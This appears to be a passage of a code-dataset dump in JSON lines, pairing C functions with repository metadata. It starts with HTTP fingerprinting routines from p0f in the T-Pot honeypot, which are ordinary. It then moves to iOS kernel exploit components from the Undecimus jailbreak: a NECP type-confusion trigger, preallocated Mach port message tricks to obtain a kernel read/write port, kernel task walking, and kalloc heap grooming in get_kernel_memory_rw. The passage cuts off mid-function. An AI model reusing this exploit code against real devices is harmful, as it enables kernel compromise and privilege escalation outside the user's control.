hsig->matched->line_no);\n\n  hrec->class_id = sig_class;\n  hrec->name_id  = sig_name;\n  hrec->flavor   = sig_flavor;\n  hrec->label_id = label_id;\n  hrec->sys      = sys;\n  hrec->sys_cnt  = sys_cnt;\n  hrec->line_no  = line_no;\n  hrec->generic  = generic;\n\n  hrec->sig      = hsig;\n\n  sig_cnt[to_srv]++;\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Score signature differences. For unknown signatures, the presumption is that\n   they identify apps, so the logic is quite different from TCP. */\n", "func_signal": "static void score_nat(u8 to_srv, struct packet_flow* f)", "code": "{\n\n  struct http_sig_record* m = f->http_tmp.matched;\n  struct host_data* hd;\n  struct http_sig* ref;\n\n  u8  score = 0, diff_already = 0;\n  u16 reason = 0;\n\n  if (to_srv) {\n\n    hd = f->client;\n    ref = hd->http_req_os;\n\n  } else {\n\n    hd = f->server;\n    ref = hd->http_resp;\n\n    /* If the signature is for a different port, don't read too much into it. */\n\n    if (hd->http_resp_port != f->srv_port) ref = NULL;\n\n  }\n\n  if (!m) {\n\n    /* No match. The user is probably running another app; this is only of\n       interest if a server progresses from known to unknown. We can't\n       compare two unknown server sigs with that much confidence. */\n\n    if (!to_srv && ref && ref->matched) {\n\n      DEBUG(\"[#] HTTP server signature changed from known to unknown.\\n\");\n      score  += 4;\n      reason |= NAT_TO_UNK;\n\n    }\n\n    goto header_check;\n\n  }\n\n  if (m->class_id == -1) {\n\n    /* Got a match for an application signature. Make sure it runs on the\n       OS we have on file... */\n\n    verify_tool_class(to_srv, f, m->sys, m->sys_cnt);\n\n    /* ...and check for inconsistencies in server behavior. */\n\n    if (!to_srv && ref && ref->matched) {\n\n      if (ref->matched->name_id != m->name_id) {\n\n        DEBUG(\"[#] Name on the matched HTTP server signature changes.\\n\");\n        score  += 8;\n        reason |= NAT_APP_LB;\n\n      } else if (ref->matched->label_id != m->label_id) {\n\n        DEBUG(\"[#] Label on the matched HTTP server signature changes.\\n\");\n        score  += 2;\n        reason |= NAT_APP_LB;\n\n      }\n\n    }\n\n  } else {\n\n    /* Ooh, spiffy: a match for an OS signature! There will be about two uses\n       for this code, ever. */\n\n    if (ref && ref->matched) {\n\n      if (ref->matched->name_id != m->name_id) {\n\n        DEBUG(\"[#] Name on the matched HTTP OS signature changes.\\n\");\n        score  += 8;\n        reason |= NAT_OS_SIG;\n        diff_already = 1;\n\n      } else if (ref->matched->name_id != m->label_id) {\n\n        DEBUG(\"[#] Label on the matched HTTP OS signature changes.\\n\");\n        score  += 2;\n        reason |= NAT_OS_SIG;\n\n      }\n\n    } else if (ref) {\n\n      DEBUG(\"[#] HTTP OS signature changed from unknown to known.\\n\");\n      score  += 4;\n      reason |= NAT_TO_UNK;\n\n    }\n\n    /* If we haven't pointed out anything major yet, also complain if the\n       signature doesn't match host data. */\n\n    if (!diff_already && hd->last_name_id != m->name_id) {\n\n      DEBUG(\"[#] Matched HTTP OS signature different than host data.\\n\");\n      score  += 4;\n      reason |= NAT_OS_SIG;\n\n    }\n\n  }\n\n  /* If we have determined that U-A looks legit, but the OS doesn't match,\n     that's a clear sign of trouble. */\n\n  if (to_srv && m->class_id == -1 && f->http_tmp.sw && !f->http_tmp.dishonest) {\n\n    u32 i;\n\n    for (i = 0; i < ua_map_cnt; i++)\n      if (strstr((char*)f->http_tmp.sw, (char*)ua_map[i].name)) break;\n\n    if (i != ua_map_cnt) {\n\n      if (ua_map[i].id != hd->last_name_id) {\n\n        DEBUG(\"[#] Otherwise plausible User-Agent points to another OS.\\n\");\n        score  += 4;\n        reason |= NAT_APP_UA;\n\n        if (!hd->bad_sw) hd->bad_sw = 1;\n\n      } else {\n\n        DEBUG(\"[#] User-Agent OS value checks out.\\n\");\n        hd->bad_sw = 0;\n\n      }\n\n    }\n\n  }\n\n\nheader_check:\n\n  /* Okay, some last-resort checks. This is obviously concerning: */\n\n  if (f->http_tmp.via) {\n    DEBUG(\"[#] Explicit use of Via or X-Forwarded-For.\\n\");\n    score  += 8;\n    reason |= NAT_APP_VIA;\n  }\n\n  /* Last but not least, see what happened to 'Date': */\n\n  if (ref && !to_srv && ref->date && f->http_tmp.date) {\n\n    s64 recv_diff = ((s64)f->http_tmp.recv_date) - ref->recv_date;\n    s64 hdr_diff  = ((s64)f->http_tmp.date) - ref->date;\n\n    if (hdr_diff < -HTTP_MAX_DATE_DIFF || \n        hdr_diff > recv_diff + HTTP_MAX_DATE_DIFF) {\n\n      DEBUG(\"[#] HTTP 'Date' distance too high (%lld in %lld sec).\\n\",\n             hdr_diff, recv_diff);\n      score  += 4;\n      reason |= NAT_APP_DATE;\n\n    } else {\n\n      DEBUG(\"[#] HTTP 'Date' distance seems fine (%lld in %lld sec).\\n\",\n             hdr_diff, recv_diff);\n\n    }\n\n  }\n\n  add_nat_score(to_srv, f, reason, score);\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Free up any allocated strings in http_sig. */\n", "func_signal": "void free_sig_hdrs(struct http_sig* h)", "code": "{\n\n  u32 i;\n\n  for (i = 0; i < h->hdr_cnt; i++) {\n    if (h->hdr[i].name) ck_free(h->hdr[i].name);\n    if (h->hdr[i].value) ck_free(h->hdr[i].value);\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Find match for a signature. */\n", "func_signal": "static void http_find_match(u8 to_srv, struct http_sig* ts, u8 dupe_det)", "code": "{\n\n  struct http_sig_record* gmatch = NULL;\n  struct http_sig_record* ref = sigs[to_srv];\n  u32 cnt = sig_cnt[to_srv];\n\n  while (cnt--) {\n\n    struct http_sig* rs = ref->sig;\n    u32 ts_hdr = 0, rs_hdr = 0;\n\n    if (rs->http_ver != -1 && rs->http_ver != ts->http_ver) goto next_sig;\n\n    /* Check that all the headers listed for the p0f.fp signature (probably)\n       appear in the examined traffic. */\n\n    if ((ts->hdr_bloom4 & rs->hdr_bloom4) != rs->hdr_bloom4) goto next_sig;\n\n    /* Confirm the ordering and values of headers (this is relatively\n       slow, hence the Bloom filter first). */\n\n    while (rs_hdr < rs->hdr_cnt) {\n\n      u32 orig_ts = ts_hdr;\n\n      while (rs->hdr[rs_hdr].id != ts->hdr[ts_hdr].id &&\n             ts_hdr < ts->hdr_cnt) ts_hdr++;\n\n      if (ts_hdr == ts->hdr_cnt) {\n\n        if (!rs->hdr[rs_hdr].optional) goto next_sig;\n\n        /* If this is an optional header, check that it doesn't appear\n           anywhere else. */\n\n        for (ts_hdr = 0; ts_hdr < ts->hdr_cnt; ts_hdr++)\n          if (rs->hdr[rs_hdr].id == ts->hdr[ts_hdr].id) goto next_sig;\n\n        ts_hdr = orig_ts;\n        rs_hdr++;\n        continue;\n\n      }\n\n      if (rs->hdr[rs_hdr].value &&\n          (!ts->hdr[ts_hdr].value ||\n          !strstr((char*)ts->hdr[ts_hdr].value,\n          (char*)rs->hdr[rs_hdr].value))) goto next_sig;\n\n      ts_hdr++;\n      rs_hdr++;\n\n    }\n\n    /* Check that the headers forbidden in p0f.fp don't appear in the traffic.\n       We first check if they seem to appear in ts->hdr_bloom4, and only if so,\n       we do a full check. */\n\n    for (rs_hdr = 0; rs_hdr < rs->miss_cnt; rs_hdr++) {\n\n      u64 miss_bloom4 = bloom4_64(rs->miss[rs_hdr]);\n\n      if ((ts->hdr_bloom4 & miss_bloom4) != miss_bloom4) continue;\n\n      /* Okay, possible instance of a banned header - scan list... */\n\n      for (ts_hdr = 0; ts_hdr < ts->hdr_cnt; ts_hdr++)\n        if (rs->miss[rs_hdr] == ts->hdr[ts_hdr].id) goto next_sig;\n\n    }\n\n    /* When doing dupe detection, we want to allow a signature with additional\n       banned headers to precede one with fewer, or with a different set. */\n\n    if (dupe_det) {\n\n      if (rs->miss_cnt > ts->miss_cnt) goto next_sig;\n\n      for (rs_hdr = 0; rs_hdr < rs->miss_cnt; rs_hdr++) {\n\n        for (ts_hdr = 0; ts_hdr < ts->miss_cnt; ts_hdr++) \n          if (rs->miss[rs_hdr] == ts->miss[ts_hdr]) break;\n\n        /* One of the reference headers doesn't appear in current sig! */\n\n        if (ts_hdr == ts->miss_cnt) goto next_sig;\n\n      }\n\n\n    }\n\n    /* Whoa, a match. */\n\n    if (!ref->generic) {\n\n      ts->matched = ref;\n\n      if (rs->sw && ts->sw && !strstr((char*)ts->sw, (char*)rs->sw))\n        ts->dishonest = 1;\n\n      return;\n\n    } else if (!gmatch) gmatch = ref;\n\nnext_sig:\n\n    ref = ref + 1;\n\n  }\n\n  /* A generic signature is the best we could find. */\n\n  if (!dupe_det && gmatch) {\n\n    ts->matched = gmatch;\n\n    if (gmatch->sig->sw && ts->sw && !strstr((char*)ts->sw,\n        (char*)gmatch->sig->sw)) ts->dishonest = 1;\n\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Register new HTTP signature. */\n", "func_signal": "void http_parse_ua(u8* val, u32 line_no)", "code": "{\n\n  u8* nxt;\n\n  while (*val) {\n\n    u32 id;\n    u8* name = NULL;\n\n    nxt = val;\n    while (*nxt && (isalnum(*nxt) || strchr(NAME_CHARS, *nxt))) nxt++;\n\n    if (val == nxt)\n      FATAL(\"Malformed system name in line %u.\", line_no);\n\n    id = lookup_name_id(val, nxt - val);\n\n    val = nxt;\n\n    if (*val == '=') {\n\n      if (val[1] != '[') \n        FATAL(\"Missing '[' after '=' in line %u.\", line_no);\n\n      val += 2;\n      nxt = val;\n\n      while (*nxt && *nxt != ']') nxt++;\n\n      if (val == nxt || !*nxt)\n        FATAL(\"Malformed signature in line %u.\", line_no);\n\n      name = DFL_ck_memdup_str(val, nxt - val);\n\n      val = nxt + 1;\n\n    }\n\n    ua_map = DFL_ck_realloc(ua_map, (ua_map_cnt + 1) *\n                        sizeof(struct ua_map_record));\n\n    ua_map[ua_map_cnt].id = id;\n   \n    if (!name) ua_map[ua_map_cnt].name = fp_os_names[id];\n      else ua_map[ua_map_cnt].name = name;\n\n    ua_map_cnt++;\n\n    if (*val == ',') val++;\n\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Dump signature flags. */\n", "func_signal": "static u8* dump_flags(struct http_sig* hsig, struct http_sig_record* m)", "code": "{\n\n  static u8* ret;\n  u32 rlen = 0;\n\n  RETF(\"\");\n\n  if (hsig->dishonest) RETF(\" dishonest\");\n  if (!hsig->sw) RETF(\" anonymous\");\n  if (m && m->generic) RETF(\" generic\");\n\n#undef RETF\n\n  if (*ret) return ret + 1; else return (u8*)\"none\";\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Examine request or response; returns 1 if more data needed and plausibly can\n   be read. Note that the buffer is always NUL-terminated. */\n", "func_signal": "u8 process_http(u8 to_srv, struct packet_flow* f)", "code": "{\n\n  /* Already decided this flow is not worth tracking? */\n\n  if (f->in_http < 0) return 0;\n\n  if (to_srv) {\n\n    u8* pay = f->request;\n    u8 can_get_more = (f->req_len < MAX_FLOW_DATA);\n    u32 off;\n\n    /* Request done, but pending response? */\n\n    if (f->http_req_done) return 1;\n\n    if (!f->in_http) {\n\n      u8 chr;\n      u8* sig_at;\n\n      /* Ooh, new flow! */\n\n      if (f->req_len < 15) return can_get_more;\n\n      /* Scan until \\n, or until binary data spotted. */\n\n      off = f->http_pos;\n\n      /* We only care about GET and HEAD requests at this point. */\n\n      if (!off && strncmp((char*)pay, \"GET /\", 5) &&\n          strncmp((char*)pay, \"HEAD /\", 6)) {\n        DEBUG(\"[#] Does not seem like a GET / HEAD request.\\n\");\n        f->in_http = -1;\n        return 0;\n      }\n\n      while (off < f->req_len && off < HTTP_MAX_URL &&\n             (chr = pay[off]) != '\\n') {\n\n        if (chr != '\\r' && (chr < 0x20 || chr > 0x7f)) {\n\n          DEBUG(\"[#] Not HTTP - character 0x%02x encountered.\\n\", chr);\n\n          f->in_http = -1;\n          return 0;\n        }\n\n        off++;\n  \n      }\n\n      /* Newline too far or too close? */\n\n      if (off == HTTP_MAX_URL || off < 14) {\n\n        DEBUG(\"[#] Not HTTP - newline offset %u.\\n\", off);\n\n        f->in_http = -1;\n        return 0;\n\n      }\n\n      /* Not enough data yet? */\n\n      if (off == f->req_len) {\n\n        f->http_pos = off;\n\n        if (!can_get_more) {\n\n          DEBUG(\"[#] Not HTTP - no opening line found.\\n\");\n          f->in_http = -1;\n\n        }\n\n        return can_get_more;\n\n      }\n\n      sig_at = pay + off - 8;\n      if (pay[off - 1] == '\\r') sig_at--;\n\n      /* Bad HTTP/1.x signature? */\n\n      if (strncmp((char*)sig_at, \"HTTP/1.\", 7)) {\n\n        DEBUG(\"[#] Not HTTP - bad signature.\\n\");\n\n        f->in_http = -1;\n        return 0;\n\n      }\n\n      f->http_tmp.http_ver = (sig_at[7] == '1');\n\n      f->in_http  = 1;\n      f->http_pos = off + 1;\n\n      DEBUG(\"[#] HTTP detected.\\n\");\n\n    }\n\n    return parse_pairs(1, f, can_get_more);\n\n  } else {\n\n    u8* pay = f->response;\n    u8 can_get_more = (f->resp_len < MAX_FLOW_DATA);\n    u32 off;\n\n    /* Response before request? Bail out. */\n\n    if (!f->in_http || !f->http_req_done) {\n      f->in_http = -1;\n      return 0;\n    }\n\n    if (!f->http_gotresp1) {\n\n      u8 chr;\n\n      if (f->resp_len < 13) return can_get_more;\n\n      /* Scan until \\n, or until binary data spotted. */\n\n      off = f->http_pos;\n\n      while (off < f->resp_len && off < HTTP_MAX_URL &&\n             (chr = pay[off]) != '\\n') {\n\n        if (chr != '\\r' && (chr < 0x20 || chr > 0x7f)) {\n\n          DEBUG(\"[#] Invalid HTTP response - character 0x%02x encountered.\\n\",\n                chr);\n          f->in_http = -1;\n          return 0;\n\n        }\n\n        off++;\n  \n      }\n\n      /* Newline too far or too close? */\n\n      if (off == HTTP_MAX_URL || off < 13) {\n\n        DEBUG(\"[#] Invalid HTTP response - newline offset %u.\\n\", off);\n\n        f->in_http = -1;\n        return 0;\n\n      }\n\n      /* Not enough data yet? */\n\n      if (off == f->resp_len) {\n\n        f->http_pos = off;\n\n        if (!can_get_more) {\n\n          DEBUG(\"[#] Invalid HTTP response - no opening line found.\\n\");\n          f->in_http = -1;\n\n        }\n\n        return can_get_more;\n\n      }\n\n      /* Bad HTTP/1.x signature? */\n\n      if (strncmp((char*)pay, \"HTTP/1.\", 7)) {\n\n        DEBUG(\"[#] Invalid HTTP response - bad signature.\\n\");\n\n        f->in_http = -1;\n        return 0;\n\n      }\n\n      f->http_tmp.http_ver = (pay[7] == '1');\n\n      f->http_pos = off + 1;\n\n      DEBUG(\"[#] HTTP response starts correctly.\\n\");\n\n\n    }\n\n    return parse_pairs(0, f, can_get_more);\n\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Ghetto Bloom filter 4-out-of-64 bitmask generator for adding 32-bit header\n   IDs to a set. We expect around 10 members in a set. */\n", "func_signal": "static inline u64 bloom4_64(u32 val)", "code": "{\n  u32 hash = hash32(&val, 4, hash_seed);\n  u64 ret;\n  ret = (1LL << (hash & 63));\n  ret ^= (1LL << ((hash >> 8) & 63));\n  ret ^= (1LL << ((hash >> 16) & 63));\n  ret ^= (1LL << ((hash >> 24) & 63));\n  return ret;\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Top-level file parsing. */\n", "func_signal": "void read_config(u8* fname)", "code": "{\n\n  s32 f;\n  struct stat st;\n  u8  *data, *cur;\n\n  f = open((char*)fname, O_RDONLY);\n  if (f < 0) PFATAL(\"Cannot open '%s' for reading.\", fname);\n\n  if (fstat(f, &st)) PFATAL(\"fstat() on '%s' failed.\", fname);\n\n  if (!st.st_size) { \n    close(f);\n    goto end_fp_read;\n  }\n\n  cur = data = ck_alloc(st.st_size + 1);\n\n  if (read(f, data, st.st_size) != st.st_size)\n    FATAL(\"Short read from '%s'.\", fname);\n\n  data[st.st_size] = 0;\n\n  close(f);\n\n  /* If you put NUL in your p0f.fp... Well, sucks to be you. */\n\n  while (1) {\n\n    u8 *eol;\n\n    line_no++;\n\n    while (isblank(*cur)) cur++;\n\n    eol = cur;\n    while (*eol && *eol != '\\n') eol++;\n\n    if (*cur != ';' && cur != eol) {\n\n      u8* line = ck_memdup_str(cur, eol - cur);\n\n      config_parse_line(line);\n\n      ck_free(line);\n\n    }\n\n    if (!*eol) break;\n\n    cur = eol + 1;\n\n  }\n\n  ck_free(data);\n\nend_fp_read:  \n\n  if (!sig_cnt)\n    SAYF(\"[!] No signatures found in '%s'.\\n\", fname);\n  else \n    SAYF(\"[+] Loaded %u signature%s from '%s'.\\n\", sig_cnt,\n         sig_cnt == 1 ? \"\" : \"s\", fname);\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Pre-register essential headers. */\n", "func_signal": "void http_init(void)", "code": "{\n  u32 i;\n\n  /* Do not change - other code depends on the ordering of first 6 entries. */\n\n  lookup_hdr(SLOF(\"User-Agent\"), 1);      /* 0 */\n  lookup_hdr(SLOF(\"Server\"), 1);          /* 1 */\n  lookup_hdr(SLOF(\"Accept-Language\"), 1); /* 2 */\n  lookup_hdr(SLOF(\"Via\"), 1);             /* 3 */\n  lookup_hdr(SLOF(\"X-Forwarded-For\"), 1); /* 4 */\n  lookup_hdr(SLOF(\"Date\"), 1);            /* 5 */\n\n#define HDR_UA  0\n#define HDR_SRV 1\n#define HDR_AL  2\n#define HDR_VIA 3\n#define HDR_XFF 4\n#define HDR_DAT 5\n\n  i = 0;\n  while (req_optional[i].name) {\n    req_optional[i].id = lookup_hdr(SLOF(req_optional[i].name), 1);\n    i++;\n  }\n\n  i = 0;\n  while (resp_optional[i].name) {\n    resp_optional[i].id = lookup_hdr(SLOF(resp_optional[i].name), 1);\n    i++;\n  }\n\n  i = 0;\n  while (req_skipval[i].name) {\n    req_skipval[i].id = lookup_hdr(SLOF(req_skipval[i].name), 1);\n    i++;\n  }\n\n  i = 0;\n  while (resp_skipval[i].name) {\n    resp_skipval[i].id = lookup_hdr(SLOF(resp_skipval[i].name), 1);\n    i++;\n  }\n\n  i = 0;\n  while (req_common[i].name) {\n    req_common[i].id = lookup_hdr(SLOF(req_common[i].name), 1);\n    i++;\n  }\n\n  i = 0;\n  while (resp_common[i].name) {\n    resp_common[i].id = lookup_hdr(SLOF(resp_common[i].name), 1);\n    i++;\n  }\n\n}", "path": "tpotce/docker/p0f/fp_http.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Look up or create OS or application id. */\n", "func_signal": "u32 lookup_name_id(u8* name, u8 len)", "code": "{\n\n  u32 i;\n\n  for (i = 0; i < name_cnt; i++)\n    if (!strncasecmp((char*)name, (char*)fp_os_names[i], len)\n        && !fp_os_names[i][len]) break;\n\n  if (i == name_cnt) {\n\n    sig_name = name_cnt;\n\n    fp_os_names = DFL_ck_realloc(fp_os_names, (name_cnt + 1) * sizeof(u8*));\n    fp_os_names[name_cnt++] = DFL_ck_memdup_str(name, len);\n\n  }\n\n  return i;\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "/* Parse 'label' parameter by looking up ID and recording name / flavor. */\n", "func_signal": "static void config_parse_label(u8* val)", "code": "{\n\n  u8* nxt;\n  u32 i;\n\n  /* Simplified handling for [mtu] signatures. */\n\n  if (mod_type == CF_MOD_MTU) {\n\n    if (!*val) FATAL(\"Empty MTU label in line %u.\\n\", line_no);\n\n    sig_flavor  = DFL_ck_strdup(val);\n    return;\n\n  }\n \n  if (*val == 'g') generic = 1;\n  else if (*val == 's') generic = 0;\n  else FATAL(\"Malformed class entry in line %u.\", line_no);\n\n  if (val[1] != ':') FATAL(\"Malformed class entry in line %u.\", line_no);\n\n  val += 2;\n\n  nxt = val;\n  while (isalnum(*nxt) || *nxt == '!') nxt++;\n\n  if (nxt == val || *nxt != ':') FATAL(\"Malformed class entry in line %u.\", line_no);\n\n  if (*val == '!' && val[1] == ':') {\n\n    sig_class = -1;\n\n  } else {\n\n    *nxt = 0;\n\n    for (i = 0; i < class_cnt; i++)\n      if (!strcasecmp((char*)val, (char*)fp_os_classes[i])) break;\n\n    if (i == class_cnt) FATAL(\"Unknown class '%s' in line %u.\", val, line_no);\n\n    sig_class = i;\n\n  }\n\n  nxt++;\n  val = nxt;\n  while (isalnum(*nxt) || (*nxt && strchr(NAME_CHARS, *nxt))) nxt++;\n\n  if (nxt == val || *nxt != ':') FATAL(\"Malformed name in line %u.\", line_no);\n\n  sig_name = lookup_name_id(val, nxt - val);\n\n  if (nxt[1]) sig_flavor = DFL_ck_strdup(nxt + 1);\n    else sig_flavor = NULL;\n\n  label_id++;\n\n}", "path": "tpotce/docker/p0f/readfp.c", "commit_date": "2017-10-13 00:00:00", "repo_name": "telekom-security/tpotce", "stars": 5720, "license": "gpl-3.0", "language": "c", "size": 256317}
{"docstring": "// receive the exception message on the port and extract the thread port\n// which we will have overwritten with a pointer to the initial kernel r/w port\n", "func_signal": "static mach_port_t receive_prealloc_msg(mach_port_t port)", "code": "{\n    kern_return_t err = mach_msg_server_once(exc_server,\n        sizeof(union max_msg),\n        port,\n        MACH_MSG_TIMEOUT_NONE);\n\n    LOG(\"receive_prealloc_msg: %s\", mach_error_string(err));\n\n    // get the pthread context back from the port and join it:\n    pthread_t t;\n    err = mach_port_get_context(mach_task_self(), port, (mach_port_context_t*)&t);\n    pthread_join(t, NULL);\n\n    return extracted_thread_port;\n}", "path": "Undecimus/Undecimus/source/multi_path_sploit.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// we need a send right for port\n", "func_signal": "static void send_prealloc_msg(mach_port_t port)", "code": "{\n    // start a new thread passing it the buffer and the exception port\n    pthread_t t;\n    pthread_create(&t, NULL, do_thread, (void*)port);\n\n    // associate the pthread_t with the port so that we can join the correct pthread\n    // when we receive the exception message and it exits:\n    kern_return_t err = mach_port_set_context(mach_task_self(), port, (mach_port_context_t)t);\n    if (err != KERN_SUCCESS) {\n        LOG(\"failed to set context\");\n    }\n    LOG(\"set context\");\n    // wait until the message has actually been sent:\n    while (!port_has_message(port)) {\n        ;\n    }\n    LOG(\"message was sent\");\n}", "path": "Undecimus/Undecimus/source/multi_path_sploit.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// size is desired kalloc size for message\n", "func_signal": "static mach_port_t prealloc_port(natural_t size)", "code": "{\n    kern_return_t err;\n    mach_port_qos_t qos = { 0 };\n    qos.prealloc = 1;\n    qos.len = message_size_for_kalloc_size(size);\n\n    mach_port_name_t name = MACH_PORT_NULL;\n\n    err = mach_port_allocate_full(mach_task_self(),\n        MACH_PORT_RIGHT_RECEIVE,\n        MACH_PORT_NULL,\n        &qos,\n        &name);\n\n    if (err != KERN_SUCCESS) {\n        LOG(\"pre-allocated port allocation failed: %s\", mach_error_string(err));\n        return MACH_PORT_NULL;\n    }\n\n    return (mach_port_t)name;\n}", "path": "Undecimus/Undecimus/source/multi_path_sploit.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// https://blogs.projectmoon.pw/2018/11/30/A-Late-Kernel-Bug-Type-Confusion-in-NECP/NECPTypeConfusion.c\n", "func_signal": "int necp_die()", "code": "{\n    int necp_fd = syscall(SYS_necp_open, 0);\n    if (necp_fd < 0) {\n        LOG(\"Create NECP client failed!\");\n        return 0;\n    }\n    LOG(\"NECP client = %d\", necp_fd);\n    syscall(SYS_necp_session_action, necp_fd, 1, 0x1234, 0x5678);\n    return 0;\n}", "path": "Undecimus/Undecimus/source/necp.c", "commit_date": "2019-02-04 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// Check if the given device number is numerically within range.\n", "func_signal": "static bool\nnumerical_device_match(unsigned major, unsigned minor,\n\t\tunsigned min_major, unsigned min_minor, unsigned max_major, unsigned max_minor)", "code": "{\n\tif (major < min_major && min_major != ANY) {\n\t\treturn false;\n\t}\n\tif ((major == min_major || min_major == ANY)\n\t\t\t&& minor < min_minor && min_minor != ANY) {\n\t\treturn false;\n\t}\n\tif (major > max_major && max_major != ANY) {\n\t\treturn false;\n\t}\n\tif ((major == max_major || max_major == ANY)\n\t\t\t&& minor > max_minor && max_minor != ANY) {\n\t\treturn false;\n\t}\n\treturn true;\n}", "path": "Undecimus/Undecimus/source/platform_match.c", "commit_date": "2019-01-30 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// task_self_addr points to the struct ipc_port for our task port\n", "func_signal": "uint64_t find_kernel_vm_map(uint64_t task_self_addr)", "code": "{\n    uint64_t struct_task = ReadKernel64(task_self_addr + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT));\n\n    while (struct_task != 0) {\n        uint64_t bsd_info = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_BSD_INFO));\n\n        uint32_t pid = ReadKernel32(bsd_info + koffset(KSTRUCT_OFFSET_PROC_PID));\n\n        if (pid == 0) {\n            uint64_t vm_map = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_VM_MAP));\n            return vm_map;\n        }\n\n        struct_task = ReadKernel64(struct_task + koffset(KSTRUCT_OFFSET_TASK_PREV));\n    }\n\n    LOG(\"unable to find kernel task...\");\n    return 0;\n}", "path": "Undecimus/Undecimus/source/async_wake.c", "commit_date": "2019-05-14 00:00:00", "repo_name": "pwn20wndstuff/Undecimus", "stars": 6651, "license": "bsd-3-clause", "language": "c", "size": 433200}
{"docstring": "// another random constant\n", "func_signal": "mach_port_t get_kernel_memory_rw()", "code": "{\n    kern_return_t err;\n\n    uint32_t MAX_KERNEL_TRAILER_SIZE = 0x44;\n    uint32_t replacer_body_size = message_size_for_kalloc_size(4096) - sizeof(mach_msg_header_t);\n    uint32_t message_body_offset = 0x1000 - replacer_body_size - MAX_KERNEL_TRAILER_SIZE;\n\n    LOG(\"message size for kalloc.4096: %d\", message_size_for_kalloc_size(4096));\n\n    if (!prepare_user_client()) {\n        return MACH_PORT_NULL;\n    }\n\n    uint64_t task_self = task_self_addr();\n    if (task_self == 0) {\n        LOG(\"unable to disclose address of our task port\");\n        return MACH_PORT_NULL;\n    }\n    LOG(\"our task port is at 0x%llx\", task_self);\n\n    int n_pre_ports = 100000; //8000\n    mach_port_t* pre_ports = prepare_ports(n_pre_ports);\n    if (pre_ports == NULL) {\n        return MACH_PORT_NULL;\n    }\n\n    // make a bunch of smaller allocations in a different zone which can be collected later:\n    uint32_t smaller_body_size = message_size_for_kalloc_size(1024) - sizeof(mach_msg_header_t);\n\n    uint8_t* smaller_body = malloc(smaller_body_size);\n    memset(smaller_body, 'C', smaller_body_size);\n\n    const int n_smaller_ports = 600; // 150 MB\n    mach_port_t smaller_ports[n_smaller_ports];\n    for (int i = 0; i < n_smaller_ports; i++) {\n        smaller_ports[i] = send_kalloc_message(smaller_body, smaller_body_size);\n        if (smaller_ports[i] == MACH_PORT_NULL) {\n            return MACH_PORT_NULL;\n        }\n    }\n\n    // now find a suitable port\n    // we'll replace the port with an ipc_kmsg buffer containing controlled data, but we don't\n    // completely control all the data:\n    // specifically we're targetting kalloc.4096 but the message body will only span\n    // xxx448 -> xxxfbc so we want to make sure the port we target is within that range\n    // actually, since we're also putting a fake task struct here and want\n    // the task's bsd_info pointer to overlap with the ip_context field we need a stricter range\n\n    int ports_to_test = 100;\n    int base = n_pre_ports - 1000;\n\n    mach_port_t first_port = MACH_PORT_NULL;\n    uint64_t first_port_address = 0;\n\n    for (int i = 0; i < ports_to_test; i++) {\n        mach_port_t candidate_port = pre_ports[base + i];\n        uint64_t candidate_address = find_port_address(candidate_port, MACH_MSG_TYPE_MAKE_SEND);\n        uint64_t page_offset = candidate_address & 0xfff;\n        if (page_offset > 0xa00 && page_offset < 0xe80) { // this range could be wider but there's no need\n            LOG(\"found target port with suitable allocation page offset: 0x%016llx\", candidate_address);\n            pre_ports[base + i] = 